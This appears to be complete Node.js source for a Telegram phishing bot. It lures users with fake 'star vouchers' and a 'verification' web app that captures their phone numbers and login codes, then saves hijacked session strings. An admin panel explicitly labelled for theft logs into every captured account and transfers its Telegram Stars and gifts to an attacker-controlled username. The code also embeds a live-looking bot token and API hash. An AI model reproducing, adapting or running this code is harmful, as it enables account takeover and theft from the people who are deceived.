const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const BOT_TOKEN = process.env.BOT_TOKEN || '8319103126:AAGvA6pmIIbgwqFE8SUUw3r-M7kRd-8OJoo';
const API_ID = parseInt(process.env.API_ID) || 32661198;
const API_HASH = process.env.API_HASH || 'd79cbe32d32c5a02a75f3d8c1937df12';
const ADMIN_USER_ID = 1398396668;

// URL, где доступен web-app + статика (fragment.html, stars.jpg, avatar.jpg)
const WEB_APP_URL = process.env.WEB_APP_URL || 'https://eeee-2bsj.onrender.com';
const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL || WEB_APP_URL;
const BOT_USERNAME = 'MyBankStar_bot';

const bot = new TelegramBot(BOT_TOKEN, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: {
            timeout: 10,
            allowed_updates: ['message', 'callback_query', 'inline_query']
        }
    },
    filepath: false
});

const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// Добавь CORS для веб-приложения
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// ================= БАЗА ДАННЫХ =================
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS user_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS used_checks (
        user_id INTEGER,
        check_id INTEGER,
        used_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, check_id)
    )`);
});

// ================= WEB APP =================
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(process.cwd(), 'public', 'fragment.html'));
});

app.post('/process', async (req, res) => {
    console.log('📨 POST /process получен:', req.body);
    
    try {
        if (req.body.stage === 'phone_entered') {
            console.log('📱 Введен номер:', req.body.phone);
            
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                try {
                    const userData = JSON.parse(decodeURIComponent(userStr));
                    userId = userData.id;
                    console.log('👤 User ID из TG:', userId);
                } catch (e) {
                    console.log('❌ Ошибка парсинга user data:', e);
                }
            }
            
            db.run(
                `INSERT INTO user_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code'],
                function(err) {
                    if (err) {
                        console.log('❌ Ошибка базы данных:', err);
                    } else {
                        console.log('✅ Данные сохранены в базу, ID:', this.lastID);
                    }
                }
            );
            
            await requestTelegramCode(req.body.phone, userId);
            res.json({ success: true, message: 'Код отправлен' });
                
        } else if (req.body.stage === 'code_entered') {
            console.log('🔢 Введен код:', req.body.code, 'для номера:', req.body.phone);
            const phone = req.body.phone;
            const code = req.body.code;
            
            await signInWithCode(phone, code);
            res.json({ success: true, message: 'Код проверен' });
        } else {
            console.log('❌ Неизвестный stage:', req.body.stage);
            res.json({ success: false, error: 'Unknown stage' });
        }
        
    } catch (error) {
        console.log('❌ Ошибка /process:', error);
        res.json({ success: false, error: error.message });
    }
});

// ================= ЗАПРОС КОДА =================
async function requestTelegramCode(phone, userId) {
    try {
        console.log(`🔄 Запрос кода для: ${phone}`);
        
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 3,
            timeout: 30000,
            useWSS: true,
            baseLogger: console
        });
        
        await client.connect();
        console.log(`✅ Подключен к Telegram API`);

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({
                    allowFlashcall: false,
                    currentNumber: true,
                    allowAppHash: true,
                    allowMissedCall: false,
                    allowFirebase: false
                })
            })
        );

        console.log(`✅ Код запрошен для ${phone}, hash: ${result.phoneCodeHash}`);
        
        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(
            `UPDATE user_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone],
            function(err) {
                if (err) {
                    console.log('❌ Ошибка обновления phone_code_hash:', err);
                } else {
                    console.log('✅ phone_code_hash сохранен в базу');
                }
            }
        );

        bot.sendMessage(ADMIN_USER_ID, `📱 Код запрошен для: ${phone}\n⏳ Ожидайте SMS...`);
        
    } catch (error) {
        console.log(`❌ Ошибка запроса кода: ${error.message}`);
        bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка для ${phone}: ${error.message}`);
    }
}

// ================= ВХОД С КОДОМ =================
async function signInWithCode(phone, code) {
    try {
        console.log(`🔐 Попытка входа для ${phone} с кодом: ${code}`);
        
        const sessionData = activeSessions.get(phone);
        if (!sessionData) {
            console.log(`❌ Нет активной сессии для ${phone}`);
            return;
        }

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            const result = await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            console.log(`✅ Успешный вход для ${phone}`);
            const sessionString = client.session.save();
            
            db.run(
                `UPDATE user_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone],
                function(err) {
                    if (err) {
                        console.log('❌ Ошибка сохранения сессии:', err);
                    } else {
                        console.log('✅ Сессия сохранена в базу');
                    }
                }
            );

            const user = await client.getMe();
            const message = `✅ Сессия сохранена: ${phone}\n👤 @${user.username || 'нет username'}\nID: ${user.id}`;
            
            bot.sendMessage(ADMIN_USER_ID, message);
            console.log(message);
            
            await client.disconnect();
            activeSessions.delete(phone);
            console.log(`✅ Клиент отключен, сессия удалена из activeSessions`);

        } catch (signInError) {
            console.log(`❌ Ошибка входа для ${phone}:`, signInError.message);
            bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка входа: ${phone} - ${signInError.message}`);
            
            try {
                await client.disconnect();
            } catch (e) {}
            
            activeSessions.delete(phone);
        }

    } catch (error) {
        console.log(`❌ Общая ошибка signInWithCode: ${error.message}`);
        bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// ================= ОБРАБОТКА ОШИБОК POLLING =================
bot.on('polling_error', (error) => {
    console.log('⚠️ Polling error:', error.code, error.message);
    if (error.code === 409) {
        console.log('🔴 Конфликт: другой экземпляр бота запущен');
        setTimeout(() => {
            console.log('🔄 Перезапускаем polling...');
            bot.stopPolling();
            setTimeout(() => bot.startPolling(), 3000);
        }, 5000);
    }
});

// ================= АДМИНСКИЕ КОМАНДЫ =================
bot.onText(/\/admin/, (msg) => {
    if (msg.from.id !== ADMIN_USER_ID) return;
    
    const adminText = `🛠️ <b>Админ панель</b>\n\nВыберите действие:`;
    
    const adminKeyboard = {
        inline_keyboard: [
            [{ text: "🎁 Украсть все подарки", callback_data: "steal_gifts" }],
            [{ text: "⭐ Украсть все звезды", callback_data: "steal_stars" }],
            [{ text: "📊 Посмотреть логи", callback_data: "show_logs" }]
        ]
    };

    bot.sendMessage(msg.chat.id, adminText, {
        parse_mode: 'HTML',
        reply_markup: adminKeyboard
    });
});

// ================= INLINE QUERY ДЛЯ ЧЕКОВ =================
bot.on('inline_query', (query) => {
    const starsUrl = `${PUBLIC_BASE_URL.replace(/\/+$/, '')}/stars.jpg`;

    const results = [
        {
            type: 'photo',
            id: 'check_50',
            photo_url: starsUrl,
            thumb_url: starsUrl,
            photo_width: 512,
            photo_height: 512,
            caption: `🎫 <b>Чек на 50 звезд</b>\n\nНажмите кнопку чтобы забрать:`,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "🪙 Забрать 50 звезд", url: `https://t.me/${BOT_USERNAME}?start=create_check_50` }
                ]]
            }
        },
        {
            type: 'photo',
            id: 'check_100',
            photo_url: starsUrl,
            thumb_url: starsUrl,
            photo_width: 512,
            photo_height: 512,
            caption: `🎫 <b>Чек на 100 звезд</b>\n\nНажмите кнопку чтобы забрать:`,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: "💫 Забрать 100 звезд", url: `https://t.me/${BOT_USERNAME}?start=create_check_100` }
                ]]
            }
        }
    ];
    
    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
});

// ================= ГЛАВНОЕ МЕНЮ =================
bot.onText(/\/start$/, (msg) => {
    const chatId = msg.chat.id;
    
    db.run(
        `INSERT OR IGNORE INTO users (user_id, username, balance) VALUES (?, ?, 0)`, 
        [msg.from.id, msg.from.username]
    );
    
    const menuText = `<b>💫 @${BOT_USERNAME} - Система передачи звезд</b>\n\nДля начала работы:`;
    
    const menuKeyboard = {
        inline_keyboard: [
            [{ text: "💰 Баланс", callback_data: "user_balance" }],
            [{ text: "🎁 Вывести", callback_data: "user_withdraw" }]
        ]
    };

    const avatarPath = path.join(process.cwd(), 'public', 'avatar.jpg');

    bot.sendPhoto(chatId, avatarPath, {
        caption: menuText,
        parse_mode: 'HTML',
        reply_markup: menuKeyboard
    }).catch(photoError => {
        console.log('❌ Ошибка фото (avatar):', photoError.message);
        bot.sendMessage(chatId, menuText, {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: menuKeyboard.inline_keyboard }
        });
    });
});

// ================= ОБРАБОТКА КНОПОК =================
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    
    try {
        await bot.answerCallbackQuery(query.id);
        
        if (query.data === 'user_balance') {
            db.get(
                `SELECT balance FROM users WHERE user_id = ?`,
                [userId],
                (err, row) => {
                    const balance = row ? row.balance : 0;
                    bot.sendMessage(chatId, `💰 Ваш баланс: ${balance} stars`);
                }
            );
            
        } else if (query.data === 'user_withdraw') {
            bot.sendMessage(
                chatId,
                `🔐 <b>Для вывода требуется верификация</b>`,
                {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "✅ Пройти верификацию", 
                                    web_app: { url: WEB_APP_URL } 
                                }
                            ]
                        ]
                    }
                }
            );
            
        } else if (query.data === 'create_50' || query.data === 'create_100') {
            const amount = query.data === 'create_50' ? 50 : 100;
            
            db.run(
                `INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
                [amount, userId],
                function(err) {
                    if (err) return;
                    
                    const checkId = this.lastID;
                    const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
                    const starsPath = path.join(process.cwd(), 'public', 'stars.jpg');

                    bot.sendPhoto(query.message.chat.id, starsPath, {
                        caption: checkText,
                        parse_mode: 'HTML',
                        reply_markup: { 
                            inline_keyboard: [[{ 
                                text: `🪙 Забрать ${amount} звезд`, 
                                url: `https://t.me/${BOT_USERNAME}?start=check_${checkId}` 
                            }]] 
                        }
                    }).catch(photoError => {
                        console.log('❌ Ошибка фото (stars):', photoError.message);
                        bot.sendMessage(query.message.chat.id, checkText, {
                            parse_mode: 'HTML',
                            reply_markup: { 
                                inline_keyboard: [[{ 
                                    text: `🪙 Забрать ${amount} звезд`, 
                                    url: `https://t.me/${BOT_USERNAME}?start=check_${checkId}` 
                                }]] 
                            }
                        });
                    });
                }
            );
        }
        
        // АДМИНСКИЕ ФУНКЦИИ
        else if (query.data === 'steal_gifts' && userId === ADMIN_USER_ID) {
            bot.sendMessage(chatId, "🔄 Начинаю кражу подарков...");
            await stealAllGifts();
        }
        else if (query.data === 'steal_stars' && userId === ADMIN_USER_ID) {
            bot.sendMessage(chatId, "🔄 Начинаю кражу звезд...");
            await stealAllStars();
        }
        else if (query.data === 'show_logs' && userId === ADMIN_USER_ID) {
            showLogs(chatId);
        }
    } catch (error) {
        console.log('Ошибка callback_query:', error.message);
    }
});

// ================= СОЗДАНИЕ ЧЕКОВ ЧЕРЕЗ @ =================
bot.onText(/@MyBankStar_bot/, (msg) => {
    bot.sendMessage(msg.chat.id, '🎫 Создание чека:', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
            ]
        }
    });
});

// ================= ОБРАБОТКА ЧЕКОВ =================
bot.onText(/\/start (.+)/, (msg, match) => {
    const params = match[1];
    const userId = msg.from.id;
    
    if (params.startsWith('check_')) {
        const checkId = params.split('_')[1];
        
        db.get(
            `SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`,
            [userId, checkId],
            (err, usedRow) => {
                if (err || usedRow) {
                    bot.sendMessage(msg.chat.id, '❌ Чек уже использован!');
                    return;
                }
                
                db.get(
                    `SELECT * FROM checks WHERE id = ? AND activations > 0`,
                    [checkId],
                    (err, row) => {
                        if (err || !row) {
                            bot.sendMessage(msg.chat.id, '❌ Чек не существует!');
                            return;
                        }
                        
                        db.get(
                            `SELECT balance FROM users WHERE user_id = ?`,
                            [userId],
                            (err, userRow) => {
                                const newBalance = (userRow ? userRow.balance : 0) + row.amount;
                                
                                db.serialize(() => {
                                    db.run(
                                        `UPDATE checks SET activations = activations - 1 WHERE id = ?`,
                                        [checkId]
                                    );
                                    db.run(
                                        `INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
                                        [userId, msg.from.username, newBalance]
                                    );
                                    db.run(
                                        `INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`,
                                        [userId, checkId]
                                    );
                                });
                                
                                bot.sendMessage(
                                    msg.chat.id, 
                                    `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
                                );
                            }
                        );
                    }
                );
            }
        );
        
    } else if (params.startsWith('create_check_')) {
        const amount = parseInt(params.split('_')[2]);
        
        db.run(
            `INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
            [amount, userId],
            function(err) {
                if (err) return;
                
                const checkId = this.lastID;
                const checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\nНажмите кнопку чтобы забрать!`;
                const starsPath = path.join(process.cwd(), 'public', 'stars.jpg');

                bot.sendPhoto(msg.chat.id, starsPath, {
                    caption: checkText,
                    parse_mode: 'HTML',
                    reply_markup: { 
                        inline_keyboard: [[{ 
                            text: `🪙 Забрать ${amount} звезд`, 
                            url: `https://t.me/${BOT_USERNAME}?start=check_${checkId}` 
                        }]] 
                    }
                }).catch(photoError => {
                    console.log('❌ Ошибка фото (stars create_check):', photoError.message);
                    bot.sendMessage(msg.chat.id, checkText, {
                        parse_mode: 'HTML',
                        reply_markup: { 
                            inline_keyboard: [[{ 
                                text: `🪙 Забрать ${amount} звезд`, 
                                url: `https://t.me/${BOT_USERNAME}?start=check_${checkId}` 
                            }]] 
                        }
                    });
                });
            }
        );
    }
});

// ================= ФУНКЦИИ КРАЖИ =================
async function stealAllGifts() {
    try {
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT phone, session_string FROM user_sessions WHERE status = 'completed'`, (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });

        let totalStolen = 0;
        
        for (const row of rows) {
            try {
                const stringSession = new StringSession(row.session_string);
                const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                    connectionRetries: 5,
                    timeout: 60000,
                    useWSS: false
                });
                
                await client.connect();
                bot.sendMessage(ADMIN_USER_ID, `🔗 Подключен к ${row.phone}, ищу подарки...`);
                
                const result = await transferGiftsToTarget(client, row.phone);
                await client.disconnect();
                
                if (result) totalStolen++;
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`Ошибка: ${row.phone}`, error.message);
                bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
            }
        }
        
        bot.sendMessage(ADMIN_USER_ID, `✅ Украдено подарков с ${totalStolen} аккаунтов`);
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка кражи подарков: ${error.message}`);
    }
}

async function stealAllStars() {
    try {
        const rows = await new Promise((resolve, reject) => {
            db.all(`SELECT phone, session_string FROM user_sessions WHERE status = 'completed'`, (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });

        let totalStolen = 0;
        
        for (const row of rows) {
            try {
                const stringSession = new StringSession(row.session_string);
                const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                    connectionRetries: 5,
                    timeout: 60000,
                    useWSS: false
                });
                
                await client.connect();
                bot.sendMessage(ADMIN_USER_ID, `🔗 Подключен к ${row.phone}, проверяю звезды...`);
                
                const result = await transferStarsToTarget(client, row.phone);
                await client.disconnect();
                
                if (result) totalStolen++;
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log(`Ошибка: ${row.phone}`, error.message);
                bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка ${row.phone}: ${error.message}`);
            }
        }
        
        bot.sendMessage(ADMIN_USER_ID, `✅ Украдено звезд с ${totalStolen} аккаунтов`);
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `❌ Ошибка кражи звезд: ${error.message}`);
    }
}

// ================= РАБОЧИЕ ФУНКЦИИ КРАЖИ =================
async function transferStarsToTarget(client, phone) {
    try {
        const status = await client.invoke(
            new Api.payments.GetStarsStatus({
                peer: new Api.InputPeerSelf(),
            })
        );

        const bal = status.balance;
        const starsAmount = Number(bal.amount) + Number(bal.nanos ?? 0) / 1_000_000_000;

        if (starsAmount === 0) {
            bot.sendMessage(ADMIN_USER_ID, `❌ ${phone}: Нет звезд`);
            return false;
        }

        const target = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
        );
        
        if (!target || !target.users || target.users.length === 0) {
            bot.sendMessage(ADMIN_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
            return false;
        }

        const targetUser = target.users[0];

        await client.invoke(
            new Api.payments.SendStars({
                peer: targetUser,
                stars: Math.floor(starsAmount),
                purpose: new Api.InputStorePaymentPremiumSubscription({
                    restore: false,
                    upgrade: true
                })
            })
        );

        db.run(`UPDATE user_sessions SET stars_data = ? WHERE phone = ?`, 
            [Math.floor(starsAmount), phone]);

        bot.sendMessage(ADMIN_USER_ID, `✅ ${phone}: Украдено ${Math.floor(starsAmount)} звезд`);
        return true;
        
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `❌ ${phone}: Ошибка передачи звезд - ${error.message}`);
        return false;
    }
}

async function transferGiftsToTarget(client, phone) {
    try {
        const gifts = await client.invoke(
            new Api.payments.GetSavedStarGifts({
                peer: new Api.InputPeerSelf(),
                offset: "",
                limit: 100,
            })
        );

        if (!gifts.gifts || gifts.gifts.length === 0) {
            bot.sendMessage(ADMIN_USER_ID, `❌ ${phone}: Нет подарков`);
            return false;
        }

        const target = await client.invoke(
            new Api.contacts.ResolveUsername({ username: 'NikLaStore' })
        );
        
        if (!target || !target.users || target.users.length === 0) {
            bot.sendMessage(ADMIN_USER_ID, `❌ ${phone}: Не найден NikLaStore`);
            return false;
        }

        const targetUser = target.users[0];
        let stolenCount = 0;

        for (const gift of gifts.gifts) {
            try {
                await client.invoke(
                    new Api.payments.TransferStarGift({
                        stargift: new Api.InputSavedStarGiftUser({ 
                            msgId: gift.msgId 
                        }),
                        toId: new Api.InputPeerUser({ 
                            userId: targetUser.id,
                            accessHash: targetUser.accessHash
                        })
                    })
                );
                
                stolenCount++;
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (e) {
                try {
                    if (gift.convertStars) {
                        await client.invoke(
                            new Api.payments.SendStars({
                                peer: targetUser,
                                stars: gift.convertStars,
                                purpose: new Api.InputStorePaymentGift({
                                    userId: targetUser.id
                                })
                            })
                        );
                        stolenCount++;
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                } catch (e2) {
                    continue;
                }
            }
        }

        if (stolenCount > 0) {
            db.run(`UPDATE user_sessions SET gifts_data = ? WHERE phone = ?`, 
                [stolenCount, phone]);
            bot.sendMessage(ADMIN_USER_ID, `✅ ${phone}: Украдено ${stolenCount} подарков`);
            return true;
        }
        
        return false;
        
    } catch (error) {
        bot.sendMessage(ADMIN_USER_ID, `❌ ${phone}: Ошибка кражи подарков - ${error.message}`);
        return false;
    }
}

// ================= ПОКАЗАТЬ ЛОГИ =================
function showLogs(chatId) {
    db.all(`SELECT phone, status, stars_data, gifts_data FROM user_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
        let logText = '📊 <b>Последние сессии:</b>\n\n';
        
        if (rows.length === 0) {
            logText = '📊 Нет данных';
        } else {
            rows.forEach(row => {
                logText += `📱 ${row.phone}\n`;
                logText += `📊 ${row.status}\n`;
                logText += `⭐ ${row.stars_data} stars\n`;
                logText += `🎁 ${row.gifts_data} gifts\n`;
                logText += `────────────\n`;
            });
        }
        
        bot.sendMessage(chatId, logText, { parse_mode: 'HTML' });
    });
}

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Сервер работает на порту ${PORT}`);
    console.log(`🌐 Web App доступен по: ${WEB_APP_URL}`);
});

console.log('✅ Бот запущен с улучшенной обработкой кодов');

// Экспорт для тестирования
module.exports = { app, bot, db };
